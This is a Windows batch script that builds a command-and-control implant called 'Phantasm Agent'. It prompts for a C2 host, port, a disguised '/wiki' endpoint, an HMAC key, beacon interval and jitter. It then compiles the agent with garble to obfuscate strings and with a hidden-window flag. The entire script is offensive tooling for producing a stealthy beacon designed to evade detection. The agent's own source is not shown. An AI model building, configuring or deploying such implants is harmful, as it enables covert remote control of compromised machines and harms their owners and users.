@echo off
setlocal enabledelayedexpansion

echo ==========================================
echo   Phantasm Agent Builder (Garble)
echo ==========================================
echo.

REM Prompt for configuration
set /p C2_HOST="C2 Relay Host [localhost]: "
if "%C2_HOST%"=="" set C2_HOST=localhost

set /p C2_PORT="C2 Relay Port [8080]: "
if "%C2_PORT%"=="" set C2_PORT=8080

set /p C2_ENDPOINT="C2 Endpoint [/wiki]: "
if "%C2_ENDPOINT%"=="" set C2_ENDPOINT=/wiki

set /p HMAC_KEY="HMAC Key (hex): "

if "%HMAC_KEY%"=="" (
    echo [ERROR] HMAC key is required!
    exit /b 1
)

set /p BEACON_INTERVAL="Beacon Interval (seconds) [15]: "
if "%BEACON_INTERVAL%"=="" set BEACON_INTERVAL=15

set /p JITTER="Jitter (seconds) [10]: "
if "%JITTER%"=="" set JITTER=10

echo.
echo Configuration:
echo   Host:            %C2_HOST%
echo   Port:            %C2_PORT% (HTTPS)
echo   Endpoint:        %C2_ENDPOINT%
echo   HMAC Key:        %HMAC_KEY:~0,16%...%HMAC_KEY:~-8%
echo   Beacon Interval: %BEACON_INTERVAL%s
echo   Jitter:          %JITTER%s
echo.

REM Check if garble is installed
where garble >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo [*] Garble not found. Installing...
    go install mvdan.cc/garble@latest
    if %ERRORLEVEL% NEQ 0 (
        echo [ERROR] Failed to install garble
        exit /b 1
    )
    echo [+] Garble installed successfully
)

echo [*] Building with garble obfuscation...

REM Build with garble
garble -literals -tiny build -ldflags "-H windowsgui -X main.listenerHost=%C2_HOST% -X main.listenerPort=%C2_PORT% -X main.listenerEndpoint=%C2_ENDPOINT% -X main.hmacKeyHex=%HMAC_KEY% -X main.reconnectIntervalStr=%BEACON_INTERVAL% -X main.jitterSecondsStr=%JITTER%" -o phantasm-agent.exe main.go

if %ERRORLEVEL% EQU 0 (
    echo.
    echo [SUCCESS] Build complete: phantasm-agent.exe
    echo.
    dir /b phantasm-agent.exe
) else (
    echo.
    echo [ERROR] Build failed!
    exit /b 1
)

